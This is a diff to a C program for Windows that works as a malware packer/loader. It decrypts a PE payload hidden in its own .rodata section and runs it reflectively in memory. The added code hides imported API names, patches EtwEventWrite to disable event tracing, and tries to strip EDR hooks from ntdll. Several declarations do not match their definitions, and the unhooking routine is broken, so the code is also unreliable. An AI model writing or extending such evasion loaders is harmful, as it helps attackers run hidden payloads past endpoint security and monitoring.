@@ -2,6 +2,8 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <windows.h>
+#include <winternl.h>
+#include <ntdef.h>
 #include <psapi.h>
 
 #define KEY_LENGTH 16 // 128 bits
@@ -13,34 +15,26 @@
 // Declarations
 void* load_PE (char* PE_data);
 int decrypt_elf(unsigned char *elf_buf, size_t file_size, unsigned char *key, size_t key_size);
+void import_table_obfuscation(void);
+void disable_etw(void);
+void remove_edr_hooks(void);
 
-// int _start(void) {
+typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
+typedef HMODULE (WINAPI * pLoadLibraryA)(LPCTSTR lpFileName);
+typedef LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef HANDLE (WINAPI* pGetCurrentProcess)(void);
+pVirtualProtect fnVirtualProtect;
+pLoadLibraryA fnLoadLibraryA;
+pVirtualAlloc fnVirtualAlloc;
+pGetCurrentProcess fnGetCurrentProcess;
 
-//     // Get the current module VA (ie PE header addr)
-//     char* unpacker_VA = (char*) GetModuleHandleA(NULL);
-
-//     // get to the section header
-//     IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) unpacker_VA;
-//     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
-//     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);
-
-//     char* packed_PE = NULL;
-//     char packed_section_name[] = ".packed";
-
-//     // search for the ".packed" section
-//     for(int i=0; i<p_NT_HDR->FileHeader.NumberOfSections; ++i) {
-//         if (mystrcmp(sections[i].Name, packed_section_name)) {
-//             packed_PE = unpacker_VA + sections[i].VirtualAddress;
-//             break;
-//         }
-//     }
-
-//     //load the data located at the .packed section
-//     if(packed_PE != NULL) {
-//         void (*packed_entry_point)(void) = (void(*)()) load_PE(packed_PE);
-//         packed_entry_point();
-//     }
-// }
+unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+unsigned char sLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x0 };
+unsigned char sVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 };
+unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
+unsigned char sGetCurrentProcess[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s', 0x0 };
+unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+unsigned char sNtdll[] = { 'N','t','d','l','l', 0x0 };
 
 int main(int argc, char** argv) {
      if (argc > 1) {
@@ -48,23 +42,22 @@ int main(int argc, char** argv) {
         return 1;
     }
 
+    import_table_obfuscation();
+    disable_etw();
+    remove_edr_hooks();
+
     FILE* loader_file = fopen(argv[0], "rb");
     if (loader_file == NULL) {
         perror("Failed to fopen loader PE file");
         return 1;
     }
 
-    // Get file size
-    fseek(loader_file, 0L, SEEK_END);
-    long int loader_file_size = ftell(loader_file);
-    fseek(loader_file, 0L, SEEK_SET);
-
-    if (fseek(loader_file, -48L, SEEK_END) != 0) {
+    if (fseek(loader_file, -40L, SEEK_END) != 0) {
         perror("Failed to seek to end of file");
         return 1;
     }
     // Read the last 8 bytes
-    char size_buffer[48]; // 8 byte loader_size + 8 byte encrypted_size + 32 byte ascii key string
+    char size_buffer[40]; // 8 byte encrypted_size + 32 byte ascii key string
     size_t read_size = fread(size_buffer, 1, sizeof(size_buffer), loader_file);
     if (read_size != sizeof(size_buffer)) {
         perror("Failed to read file");
@@ -72,24 +65,39 @@ int main(int argc, char** argv) {
     }
     fseek(loader_file, 0L, SEEK_SET);
 
-    size_t loader_size = *(int64_t*)(size_buffer);
-    size_t encrypted_size = *(int64_t*)(size_buffer+8);
-    char *key_hexstring = (size_buffer+16);
-    printf("Loader size: %i\n", loader_size);
-    printf("Encrypted size: %i\n", encrypted_size);
-    printf("Loader file size: %i\n", loader_file_size);
-    printf("Obfuscated Decode key: %s\n", key_hexstring);
+    size_t encrypted_size = *(int64_t*)(size_buffer);
+    char *key_hexstring = (size_buffer+8);
+    printf("Encrypted size: 0x%.8x\n", encrypted_size);
+    printf("Obfuscated Decode key: %.32s\n", key_hexstring);
+
+    // Get the current module VA (ie PE header addr)
+    char* loader_handle = (char*)GetModuleHandleA(NULL);
+
+    // get to the section header
+    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) loader_handle;
+    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
+    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);
+
+    char* payload_PE = NULL;
+    char payload_PE_section_name[] = ".rodata";
+
+    for(int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
+        if (!strcmp(sections[i].Name, payload_PE_section_name)) {
+            printf("Found .rodata section\n");
+            payload_PE = loader_handle + sections[i].VirtualAddress;
+            printf("Payload PE at VA: 0x%.8x\n", payload_PE);
+            break;
+        }
+    }
+
+    if(payload_PE == NULL) {
+        printf("Couldn't find payload PE\n");
+        return 1;   
+    }
 
     // Allocate memory and read the whole file
     char* pe_buf = malloc(encrypted_size);
-
-    // Read file
-    fseek(loader_file, loader_size, SEEK_SET);
-    size_t l_n_read = fread(pe_buf, 1, encrypted_size, loader_file);
-    if(l_n_read != encrypted_size) {
-        printf("reading error (%d)\n", l_n_read);
-        return 1;
-    }
+    memcpy(pe_buf, payload_PE, encrypted_size);
 
     // Get key from input and decode to byte array
     const char *pos = key_hexstring;
@@ -104,19 +112,17 @@ int main(int argc, char** argv) {
     decrypt_PE(pe_buf, encrypted_size, key);
 
     printf("Load PE\n");
-    // Load the PE into memory
     void* start_address = load_PE(pe_buf);
 
-    printf("Starting PE\n");
+    printf("Calling PE\n");
     if(start_address) {
-        // call its entry point
         ((void (*)(void)) start_address)();
     }
 
     return 0;
 }
 
-void* load_PE (char* PE_data) {
+void* load_PE(char* PE_data) {
     // DEFINITIONS OF HEADERS AND CO.
     IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) PE_data;
     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
@@ -131,7 +137,7 @@ void* load_PE (char* PE_data) {
 
     printf("hdr_image_base:%i\nsize_of_image:%i\nentry_point_RVA:%i\nsize_of_headers:%i\nnum_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);
 
-    char* image_base = (char*)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    char* image_base = (char*)fnVirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if(image_base == NULL) return NULL; // allocation didn't work
 
     printf("Copy PE section wise into memory\n");
@@ -166,7 +172,7 @@ void* load_PE (char* PE_data) {
 
         // Get the name of the dll, and import it
         char* module_name = image_base + import_descriptors[i].Name;
-        HMODULE import_module = LoadLibraryA(module_name);
+        HMODULE import_module = fnLoadLibraryA(module_name);
         printf("Module Name: %s\n", module_name);
         
         if (import_module == NULL) {
@@ -258,7 +264,7 @@ void* load_PE (char* PE_data) {
     // PERMISSIONS
     // Set permission for the PE header to read only
     DWORD old_protect;
-    VirtualProtect(image_base, size_of_headers, PAGE_READONLY, &old_protect);
+    fnVirtualProtect(image_base, size_of_headers, PAGE_READONLY, &old_protect);
 
     // Match permissions from headers
     for (int i = 0; i < num_of_sections; ++i) {
@@ -270,7 +276,7 @@ void* load_PE (char* PE_data) {
         } else {
             virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
         }
-        VirtualProtect(dest_addr, sections[i].Misc.VirtualSize, virtual_flags, &old_protect);
+        fnVirtualProtect(dest_addr, sections[i].Misc.VirtualSize, virtual_flags, &old_protect);
     }
 
     return (void*) (image_base + entry_point_RVA);
@@ -279,6 +285,67 @@ void* load_PE (char* PE_data) {
 
 // ============= LOADER OBFUSCATION HERE =============
 
+void import_table_obfuscation(void) {
+    fnVirtualProtect = (pVirtualProtect) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualProtect);
+    fnLoadLibraryA = (pLoadLibraryA) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sLoadLibraryA);
+    fnVirtualAlloc = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualAlloc);
+    fnGetCurrentProcess = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sGetCurrentProcess);
+}
+
+void disableETW(void) {
+	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
+	
+	ULONG oldprotect = 0;
+	size_t size = sizeof(patch);
+	
+	HANDLE hCurrentProc = fnGetCurrentProcess();
+	
+	void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
+	
+    fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);
+
+	memcpy(pEventWrite, patch, size / sizeof(patch[0]));
+	
+    fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
+	FlushInstructionCache(hCurrentProc, pEventWrite, size);
+}
+
+int remove_edr_hooks(void) {
+    // Öffnen der Sektion für ntdll.dll in Known DLLs
+    UNICODE_STRING uNtdll = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
+    OBJECT_ATTRIBUTES objAttrs;
+    InitializeObjectAttributes(&objAttrs, &uNtdll, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    HANDLE hSection;
+    NTSTATUS status = NtOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttrs);
+
+    if (!NT_SUCCESS(status)) {
+        printf("Konnte Sektion für ntdll.dll nicht öffnen\n");
+        return 1;
+    }
+
+    // Mappen der Sektion in den eigenen Prozess
+    void* pLocalNtdll = NULL;
+    SIZE_T viewSize = 0;
+    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalNtdll, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READWRITE);
+
+    if (!NT_SUCCESS(status)) {
+        printf("Konnte Sektion für ntdll.dll nicht mappen\n");
+        return 1;
+    }
+
+    // Überschreiben der .TEXT-Sektion
+    DWORD oldProtect;
+    fnVirtualProtect(pLocalNtdll, viewSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    BYTE patch[] = { 0x48, 0x33, 0xc0, 0xc3 };  // xor rax, rax; ret
+    memcpy(pLocalNtdll, patch, sizeof(patch));
+
+    // Entladen der sauberen ntdll.dll
+    fnVirtualProtect(pLocalNtdll, viewSize, oldProtect, &oldProtect);
+    NtUnmapViewOfSection(GetCurrentProcess(), pLocalNtdll);
+    NtClose(hSection);
+
+    return 0;
+}
 
 
 // =============== DEOBFUSCATION HERE ================
